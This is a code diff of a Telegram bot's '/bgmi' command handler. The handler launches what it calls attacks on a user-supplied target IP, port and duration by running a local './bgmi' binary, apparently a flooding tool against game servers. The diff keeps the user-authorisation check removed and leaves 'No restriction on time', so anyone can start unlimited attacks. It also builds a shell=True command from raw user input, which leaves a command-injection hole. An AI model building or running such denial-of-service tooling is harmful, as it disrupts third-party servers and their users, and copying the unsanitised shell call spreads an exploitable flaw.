@@ -287,23 +287,28 @@ COOLDOWN_TIME =0
 def handle_bgmi(message):
     # Remove the check for allowed_user_ids
     # user_id = str(message.chat.id)
-    # if user_id in allowed_user_ids:
     
     command = message.text.split()
     if len(command) == 4:
         target = command[1]
         port = int(command[2])
         time = int(command[3])
-    # No restriction on time
-    record_command_logs(user_id, '/bgmi', target, port, time)
-    log_command(user_id, target, port, time)
-    start_attack_reply(message, target, port, time)
-    full_command = f"./bgmi {target} {port} {time} 110"
-    process = subprocess.run(full_command, shell=True)
-    response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+        
+        # No restriction on time
+        user_id = str(message.chat.id)  # Get user ID
+        record_command_logs(user_id, '/bgmi', target, port, time)
+        log_command(user_id, target, port, time)
+        start_attack_reply(message, target, port, time)
+        
+        full_command = f"./bgmi {target} {port} {time} 110"
+        process = subprocess.run(full_command, shell=True)
+        
+        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
     else:
         response = "✅ Usage :- /bgmi <target> <port> <time>"
-        bot.reply_to(message, response)
+    
+    bot.reply_to(message, response)
+
 
 
 
